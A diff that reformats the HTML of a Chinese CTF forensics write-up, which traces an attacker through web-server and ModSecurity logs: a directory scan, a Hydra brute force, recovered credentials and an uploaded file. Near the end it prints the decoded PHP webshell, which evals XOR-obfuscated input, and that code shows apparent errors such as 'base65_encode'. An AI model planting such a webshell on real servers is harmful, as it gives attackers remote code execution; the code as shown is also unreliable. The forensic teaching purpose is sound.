@@ -467,24 +467,23 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="铁人三项溯源"><a href="#铁人三项溯源" class="headerlink" title="铁人三项溯源"></a>铁人三项溯源</h1><blockquote>
-<p><a target="_blank" rel="noopener" href="https://bohe-mian.com/2023/05/05/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%80%BB%E5%86%B3%E8%B5%9B-%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81wp/">挂一下源博客</a></p>
+                <h1 id="铁人三项溯源">铁人三项溯源</h1>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://bohe-mian.com/2023/05/05/第四届长城杯信息安全铁人三项赛总决赛-溯源取证wp/">挂一下源博客</a></p>
 </blockquote>
-<h2 id="1，黑客攻击服务器时使用的内网ip为多少"><a href="#1，黑客攻击服务器时使用的内网ip为多少" class="headerlink" title="1，黑客攻击服务器时使用的内网ip为多少"></a>1，黑客攻击服务器时使用的内网ip为多少</h2><blockquote>
+<h2 id="黑客攻击服务器时使用的内网ip为多少">1，黑客攻击服务器时使用的内网ip为多少</h2>
+<blockquote>
 <p>看目录</p>
 </blockquote>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> -al<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <blockquote>
 <p>进去看10条</p>
 </blockquote>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">head</span> -n <span class="token number">10</span> access_log-20230426<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <blockquote>
 <p>看100条</p>
 </blockquote>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">head <span class="token operator">-</span>n <span class="token number">100</span> access_log<span class="token operator">-</span><span class="token number">20230426</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">192.168</span>.12.140 - - <span class="token punctuation">[</span>04/Dec/2019:16:01:31 +0800<span class="token punctuation">]</span> <span class="token string">"GET /_scriptlibrary HTTP/1.1"</span> <span class="token number">404</span> <span class="token number">212</span> <span class="token string">"-"</span> <span class="token string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span>
 <span class="token number">192.168</span>.12.140 - - <span class="token punctuation">[</span>04/Dec/2019:16:01:31 +0800<span class="token punctuation">]</span> <span class="token string">"GET /_scripts HTTP/1.1"</span> <span class="token number">404</span> <span class="token number">206</span> <span class="token string">"-"</span> <span class="token string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span>
 <span class="token number">192.168</span>.12.140 - - <span class="token punctuation">[</span>04/Dec/2019:16:01:31 +0800<span class="token punctuation">]</span> <span class="token string">"GET /_source HTTP/1.1"</span> <span class="token number">404</span> <span class="token number">205</span> <span class="token string">"-"</span> <span class="token string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span>
@@ -494,20 +493,17 @@
 <span class="token number">192.168</span>.12.140 - - <span class="token punctuation">[</span>04/Dec/2019:16:01:31 +0800<span class="token punctuation">]</span> <span class="token string">"GET /_swf HTTP/1.1"</span> <span class="token number">404</span> <span class="token number">202</span> <span class="token string">"-"</span> <span class="token string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span>
 <span class="token number">192.168</span>.12.140 - - <span class="token punctuation">[</span>04/Dec/2019:16:01:31 +0800<span class="token punctuation">]</span> <span class="token string">"GET /_temp HTTP/1.1"</span> <span class="token number">404</span> <span class="token number">203</span> <span class="token string">"-"</span> <span class="token string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span>
 <span class="token number">192.168</span>.12.140 - - <span class="token punctuation">[</span>04/Dec/2019:16:01:31 +0800<span class="token punctuation">]</span> <span class="token string">"GET /_tempalbums HTTP/1.1"</span> <span class="token number">404</span> <span class="token number">209</span> <span class="token string">"-"</span> <span class="token string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag:192.168.12.140<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h2 id="2，黑客嗦进行的目录扫描一共有多少条"><a href="#2，黑客嗦进行的目录扫描一共有多少条" class="headerlink" title="2，黑客嗦进行的目录扫描一共有多少条"></a>2，黑客嗦进行的目录扫描一共有多少条</h2><blockquote>
-<p>这里一条一条的数肯定不现实，可以grep进行匹配，然后wc进行计数，匹配话，我们进行user-agent匹配，上面已经看到很多404的user-agent为”Mozilla&#x2F;4.0 (compatible; MSIE 6.0; Windows NT 5.1)”,我们使用命令</p>
+<h2 id="黑客嗦进行的目录扫描一共有多少条">2，黑客嗦进行的目录扫描一共有多少条</h2>
+<blockquote>
+<p>这里一条一条的数肯定不现实，可以grep进行匹配，然后wc进行计数，匹配话，我们进行user-agent匹配，上面已经看到很多404的user-agent为”Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”,我们使用命令</p>
 </blockquote>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Mozilla/4.0 <span class="token punctuation">(</span>compatible<span class="token punctuation">;</span> MSIE <span class="token number">6.0</span><span class="token punctuation">;</span> Windows NT <span class="token number">5.1</span><span class="token punctuation">)</span>
 
 <span class="token function">cat</span> access_log-20230426 <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span> <span class="token operator">|</span> <span class="token function">wc</span> -l<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/SY_project/T3/t3<span class="token punctuation">]</span>
 └─<span class="token comment"># cat access_log-20230426 | grep "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" | wc -l</span>
 <span class="token number">55510</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-c <span class="token comment"># 统计字节数，或--bytes或——chars：只显示Bytes数；。</span>
 -l <span class="token comment"># 统计行数，或——lines：只显示列数；。</span>
 -m <span class="token comment"># 统计字符数。这个标志不能与 -c 标志一起使用。</span>
@@ -520,27 +516,23 @@
 将2个命令隔开
 “<span class="token operator">|</span>”左边命令的输出就会作为“<span class="token operator">|</span>”右边命令的输入
 简单来讲就是传递作用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag:55510<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h2 id="3，黑客进行账号密码爆破的次数"><a href="#3，黑客进行账号密码爆破的次数" class="headerlink" title="3，黑客进行账号密码爆破的次数"></a>3，黑客进行账号密码爆破的次数</h2><blockquote>
+<h2 id="黑客进行账号密码爆破的次数">3，黑客进行账号密码爆破的次数</h2>
+<blockquote>
 <p>看 100 条</p>
 </blockquote>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">head</span> -n <span class="token number">100</span> access_log-20230426  <span class="token comment"># 没看到啥</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <blockquote>
-<p>匹配一下:&#x2F;&#x2F;</p>
+<p>匹配一下://</p>
 </blockquote>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.12.154/index.php?c<span class="token operator">=</span>access<span class="token operator">&amp;</span><span class="token assign-left variable">a</span><span class="token operator">=</span>login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <blockquote>
-<p>抓一下 c&#x3D;access&amp;a&#x3D;login</p>
+<p>抓一下 c=access&amp;a=login</p>
 </blockquote>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> access_log-20230426 <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"c=access&amp;a=login"</span> <span class="token operator">|</span> <span class="token function">wc</span> -l
 
 └─<span class="token comment"># cat access_log-20230426 | grep "c=access&amp;a=login" | wc -l</span>
 <span class="token number">4116</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
 <blockquote>
 <p>爆破是post请求</p>
 </blockquote>
@@ -548,7 +540,6 @@
 
 └─<span class="token comment"># cat access_log-20230426 | grep "index.php?c=access&amp;a=login" | wc -l</span>
 <span class="token number">2053</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
 <blockquote>
 <p>先不要抓一行,抓出来看看，有什么不一样的</p>
 </blockquote>
@@ -561,25 +552,22 @@
 <span class="token number">192.168</span>.12.140 - - <span class="token punctuation">[</span>04/Dec/2019:16:22:34 +0800<span class="token punctuation">]</span> <span class="token string">"POST /index.php?c=access&amp;a=login HTTP/1.1"</span> <span class="token number">302</span> - <span class="token string">"http://192.168.12.154/index.php?c=access&amp;a=login"</span> <span class="token string">"Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"</span>
 <span class="token number">192.168</span>.12.140 - - <span class="token punctuation">[</span>04/Dec/2019:16:22:34 +0800<span class="token punctuation">]</span> <span class="token string">"GET /index.php?c=access&amp;a=index HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">126659</span> <span class="token string">"http://192.168.12.154/index.php?c=access&amp;a=login"</span> <span class="token string">"Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"</span>
 <span class="token number">192.168</span>.12.140 - - <span class="token punctuation">[</span>04/Dec/2019:16:30:19 +0800<span class="token punctuation">]</span> <span class="token string">"GET /index.php?c=access&amp;a=login HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5187</span> <span class="token string">"-"</span> <span class="token string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <blockquote>
-<p>也就是 爆破得带这个 Mozilla&#x2F;5.0 (Hydra)</p>
+<p>也就是 爆破得带这个 Mozilla/5.0 (Hydra)</p>
 </blockquote>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> access_log-20230426 <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"Mozilla/5.0 (Hydra)"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"POST /index.php?c=access&amp;a=login"</span>
 
 格式一样了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
 <blockquote>
-<p>抓一行 </p>
+<p>抓一行</p>
 </blockquote>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> access_log-20230426 <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"Mozilla/5.0 (Hydra)"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"POST /index.php?c=access&amp;a=login"</span> <span class="token operator">|</span> <span class="token function">wc</span> -l
 
 └─<span class="token comment"># cat access_log-20230426 | grep "Mozilla/5.0 (Hydra)" | grep "POST /index.php?c=access&amp;a=login" | wc -l</span>
 <span class="token number">2051</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag:2051<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h2 id="4，黑客登录时使用的账号密码为多少，格式账号、密码"><a href="#4，黑客登录时使用的账号密码为多少，格式账号、密码" class="headerlink" title="4，黑客登录时使用的账号密码为多少，格式账号、密码"></a>4，黑客登录时使用的账号密码为多少，格式账号、密码</h2><blockquote>
+<h2 id="黑客登录时使用的账号密码为多少格式账号密码">4，黑客登录时使用的账号密码为多少，格式账号、密码</h2>
+<blockquote>
 <p>抓一下</p>
 </blockquote>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> access_log-20230426 <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"c=access&amp;a=login"</span>
@@ -594,14 +582,12 @@
 <span class="token number">192.168</span>.12.140 - - <span class="token punctuation">[</span>04/Dec/2019:16:22:34 +0800<span class="token punctuation">]</span> <span class="token string">"POST /index.php?c=access&amp;a=login HTTP/1.1"</span> <span class="token number">302</span> - <span class="token string">"http://192.168.12.154/index.php?c=access&amp;a=login"</span> <span class="token string">"Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"</span>
 <span class="token number">192.168</span>.12.140 - - <span class="token punctuation">[</span>04/Dec/2019:16:22:34 +0800<span class="token punctuation">]</span> <span class="token string">"GET /index.php?c=access&amp;a=index HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">126659</span> <span class="token string">"http://192.168.12.154/index.php?c=access&amp;a=login"</span> <span class="token string">"Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"</span>
 <span class="token number">192.168</span>.12.140 - - <span class="token punctuation">[</span>04/Dec/2019:16:30:19 +0800<span class="token punctuation">]</span> <span class="token string">"GET /index.php?c=access&amp;a=login HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5187</span> <span class="token string">"-"</span> <span class="token string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <blockquote>
 <p>这一行很奇怪</p>
 </blockquote>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">192.168</span>.12.140 - - <span class="token punctuation">[</span>04/Dec/2019:16:22:34 +0800<span class="token punctuation">]</span> <span class="token string">"POST /index.php?c=access&amp;a=login HTTP/1.1"</span> <span class="token number">302</span> - <span class="token string">"http://192.168.12.154/index.php?c=access&amp;a=login"</span> <span class="token string">"Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <blockquote>
-<p>modsec_audit.log-20230426 在这个文件里查找时间  2019:16:22:34</p>
+<p>modsec_audit.log-20230426 在这个文件里查找时间 2019:16:22:34</p>
 </blockquote>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">--2d6bdf4c-A--
 <span class="token punctuation">[</span>04/Dec/2019:16:22:34 +0800<span class="token punctuation">]</span> XedsymRc9uMOIVLA@x7DOwAAAAk <span class="token number">192.168</span>.12.140 <span class="token number">60944</span> <span class="token number">192.168</span>.12.154 <span class="token number">80</span>
@@ -622,21 +608,18 @@ Upgrade-Insecure-Requests: <span class="token number">1</span>
 --2d6bdf4c-C--
 login%5Busername%5D<span class="token operator">=</span>admin<span class="token operator">&amp;</span>login%5Bpassword%5D<span class="token operator">=</span>p455w0rd<span class="token operator">&amp;</span><span class="token assign-left variable">configOptionSelect</span><span class="token operator">=</span>Default
 --2d6bdf4c-F--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag:admin/p455w0rd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h2 id="5，黑客添加的email地址为多少"><a href="#5，黑客添加的email地址为多少" class="headerlink" title="5，黑客添加的email地址为多少"></a>5，黑客添加的email地址为多少</h2><blockquote>
+<h2 id="黑客添加的email地址为多少">5，黑客添加的email地址为多少</h2>
+<blockquote>
 <p>抓一下</p>
 </blockquote>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> access_log-20230426 <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"</span>
 没抓到<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
 <blockquote>
 <p>换一个抓.com</p>
 </blockquote>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> access_log-20230426 <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">".com"</span> 
 <span class="token comment"># 太多冗余了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
 <blockquote>
 <p>让我们试一下正则</p>
 </blockquote>
@@ -650,17 +633,15 @@ login%5Busername%5D<span class="token operator">=</span>admin<span class="token 
 <span class="token punctuation">\</span>.：表示匹配一个点号（“.”）。需要使用反斜杠进行转义，因为点号在正则表达式表示任意字符，加反斜杠转义后表示匹配真实的点号。
 <span class="token punctuation">(</span>com<span class="token punctuation">)</span>+：表示匹配一个或多个连续的“com”字符串，可以匹配<span class="token string">"com"</span>、“comcom”、<span class="token string">"comcomcom"</span>等。
 因此，该正则表达式可以匹配例如“example.com”、“www.example.com”、“foo.bar.com”、“example.com.com”等字符串。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/SY_project/T3/t3<span class="token punctuation">]</span>
 └─<span class="token comment"># cat access_log-20230426 | grep -E "\.(com)+" </span>
 <span class="token number">192.168</span>.12.140 - - <span class="token punctuation">[</span>04/Dec/2019:16:23:22 +0800<span class="token punctuation">]</span> <span class="token string">"GET /index.php?&amp;ajax=true&amp;c=contact&amp;a=check_existing_email&amp;email=admin%40zz.com&amp;id_contact=&amp;contact_type=og_1575447785_947935 HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">212</span> <span class="token string">"http://192.168.12.154/"</span> <span class="token string">"Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"</span>
 <span class="token number">192.168</span>.12.140 - - <span class="token punctuation">[</span>04/Dec/2019:16:29:26 +0800<span class="token punctuation">]</span> <span class="token string">"GET /upload/055/741/33e/896eee6d3709e7ff535b01986e7de1a HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">772</span> <span class="token string">"http://www.google.com/url?sa=1&amp;source=web&amp;ct=7&amp;url=http%3A//192.168.12.154/upload/055/741/33e/896eee6d3709e7ff535b01986e7de1a&amp;rct=j&amp;q=&amp;ei=ZWNob&amp;usg=yg0MT&amp;sig2=YwMik7"</span> <span class="token string">"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; es-es) AppleWebKit/418.8 (KHTML, like Gecko) Safari/419.3"</span>
 <span class="token number">192.168</span>.12.140 - - <span class="token punctuation">[</span>04/Dec/2019:16:29:46 +0800<span class="token punctuation">]</span> <span class="token string">"GET /upload/055/741/33e/896eee6d3709e7ff535b01986e7de1a HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">772</span> <span class="token string">"http://www.google.com/url?sa=1&amp;source=web&amp;ct=7&amp;url=http%3A//192.168.12.154/upload/055/741/33e/896eee6d3709e7ff535b01986e7de1a&amp;rct=j&amp;q=&amp;ei=ZWNob&amp;usg=yg1Mj&amp;sig2=Q2Myk7"</span> <span class="token string">"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/416.12 (KHTML, like Gecko) Safari/416.13"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@ -<span class="token operator">></span> %40 url编码
 flag:admin@zz.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<h2 id="6，黑客第一次上传木马的绝对路径为多少，该木马未被使用"><a href="#6，黑客第一次上传木马的绝对路径为多少，该木马未被使用" class="headerlink" title="6，黑客第一次上传木马的绝对路径为多少，该木马未被使用"></a>6，黑客第一次上传木马的绝对路径为多少，该木马未被使用</h2><blockquote>
+<h2 id="黑客第一次上传木马的绝对路径为多少该木马未被使用">6，黑客第一次上传木马的绝对路径为多少，该木马未被使用</h2>
+<blockquote>
 <p>抓一下</p>
 </blockquote>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> access_log-20230426 <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"</span>
@@ -676,20 +657,17 @@ flag:admin@zz.com<span aria-hidden="true" class="line-numbers-rows"><span></span
 <span class="token number">192.168</span>.12.140 - - <span class="token punctuation">[</span>04/Dec/2019:16:30:56 +0800<span class="token punctuation">]</span> <span class="token string">"GET /icons/back.gif HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">216</span> <span class="token string">"http://192.168.12.154/upload/"</span> <span class="token string">"Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"</span>
 <span class="token number">192.168</span>.12.140 - - <span class="token punctuation">[</span>04/Dec/2019:16:30:56 +0800<span class="token punctuation">]</span> <span class="token string">"GET /icons/folder.gif HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">225</span> <span class="token string">"http://192.168.12.154/upload/"</span> <span class="token string">"Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"</span>
 <span class="token number">192.168</span>.12.140 - - <span class="token punctuation">[</span>04/Dec/2019:16:31:28 +0800<span class="token punctuation">]</span> <span class="token string">"GET /111.php HTTP/1.1"</span> <span class="token number">200</span> - <span class="token string">"-"</span> <span class="token string">"Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">这个上传命令很奇怪
 <span class="token number">192.168</span>.12.140 - - <span class="token punctuation">[</span>04/Dec/2019:16:29:04 +0800<span class="token punctuation">]</span> <span class="token string">"GET /upload/055/741/33e/896eee6d3709e7ff535b01986e7de1a HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">772</span> <span class="token string">"http://192.168.12.154/upload/055/741/33e/"</span> <span class="token string">"Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
 <blockquote>
 <p>抓一下其他</p>
 </blockquote>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">upload/055
 <span class="token function">cat</span> access_log-20230426 <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"upload/055"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
 <blockquote>
 <p>去详细文件里看一下 (modsec_audit.log-20230426)</p>
-<p>在文件modsec_audit.log-20230426 匹配 upload&#x2F;055 只有31项</p>
-<p>在文件modsec_audit.log-20230426 匹配 POST &#x2F;upload&#x2F;055 只有2项</p>
+<p>在文件modsec_audit.log-20230426 匹配 upload/055 只有31项</p>
+<p>在文件modsec_audit.log-20230426 匹配 POST /upload/055 只有2项</p>
 </blockquote>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">POST /upload/055/741/33e/896eee6d3709e7ff535b01986e7de1a HTTP/1.1
 Accept-Encoding: identity
@@ -698,28 +676,23 @@ Host: <span class="token number">192.168</span>.12.154
 Content-Type: application/x-www-form-urlencoded
 Connection: close
 User-Agent: Opera/9.25 <span class="token punctuation">(</span>Windows NT <span class="token number">5.1</span><span class="token punctuation">;</span> U<span class="token punctuation">;</span> zh-cn<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">路径 /upload/055/741/33e/896eee6d3709e7ff535b01986e7de1a
 flag:/var/www/html//upload/055/741/33e/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<h2 id="7，黑客上传的木马方式为什么，木马密码为什么，大写字母，用空格分开"><a href="#7，黑客上传的木马方式为什么，木马密码为什么，大写字母，用空格分开" class="headerlink" title="7，黑客上传的木马方式为什么，木马密码为什么，大写字母，用空格分开"></a>7，黑客上传的木马方式为什么，木马密码为什么，大写字母，用空格分开</h2><blockquote>
+<h2 id="黑客上传的木马方式为什么木马密码为什么大写字母用空格分开">7，黑客上传的木马方式为什么，木马密码为什么，大写字母，用空格分开</h2>
+<blockquote>
 <p>抓一下.php</p>
 </blockquote>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> access_log-20230426 <span class="token operator">|</span> <span class="token function">grep</span> -E <span class="token string">"\.(php)+"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">192.168</span>.12.140 - - <span class="token punctuation">[</span>04/Dec/2019:16:22:38 +0800<span class="token punctuation">]</span> <span class="token string">"POST /index.php?c=gui&amp;a=save_state HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">16</span> <span class="token string">"http://192.168.12.154/index.php?c=access&amp;a=index"</span> <span class="token string">"Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"</span>
 
 <span class="token number">192.168</span>.12.140 - - <span class="token punctuation">[</span>04/Dec/2019:16:35:49 +0800<span class="token punctuation">]</span> <span class="token string">"POST /111.php HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">52</span> <span class="token string">"-"</span> <span class="token string">"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.9) Gecko/20061215 Red Hat/1.5.0.9-0.1.el4 Firefox/1.5.0.9"</span>
 <span class="token comment"># 发现两个 index.php 111.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
 <blockquote>
 <p>index.php 不可疑 我们仔细看一下 111.php</p>
 </blockquote>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> access_log-20230426 <span class="token operator">|</span> <span class="token function">grep</span> -E <span class="token string">"111\.(php)+"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">192.168</span>.12.140 - - <span class="token punctuation">[</span>04/Dec/2019:16:31:16 +0800<span class="token punctuation">]</span> <span class="token string">"PUT /111.php HTTP/1.1"</span> <span class="token number">201</span> <span class="token number">180</span> <span class="token string">"-"</span> <span class="token string">"curl/7.63.0"</span>
 <span class="token comment"># 那么就是 PUT 传参了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
 <blockquote>
 <p>分析密码</p>
 </blockquote>
@@ -739,7 +712,6 @@ flag:/var/www/html//upload/055/741/33e/<span aria-hidden="true" class="line-numb
 <span class="token variable">$V</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">(</span><span class="token string">''</span>,<span class="token variable">$J</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$V</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token builtin class-name">echo</span> <span class="token variable">$J</span><span class="token punctuation">;</span>
 ?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"># 运行一下
 
 $k="bd377f17";$kh="9d4cd50b4843";$kf="5bd9ce820932";$p="oOtvNy5TkuOg1fjf";function x($t,$k)&#123;$c=strlen($k);$l=strlen($t);$o="";for($i=1;$i&lt;$l;)&#123;for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)&#123;$o.=$t&#123;$i&#125;^$k&#123;$j&#125;;&#125;&#125;return $o;&#125;if (@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)==2) &#123;@ob_start();@eval(@gzuncompress(@x(@base64_decode($m[2]),$k)));$o=@ob_get_contents();@ob_end_clean();$r=@base65_encode(@x(@gzcompress($o),$k));print("$p$kh$r$kf");&#125;
@@ -772,7 +744,6 @@ $k="bd377f17";$kh="9d4cd50b4843";$kf="5bd9ce820932";$p="oOtvNy5TkuOg1fjf";functi
                                                                          <span class="token punctuation">&#125;</span>
 <span class="token comment"># 具体解密看这篇文章 https://xz.aliyun.com/t/11246#reply-18400</span>
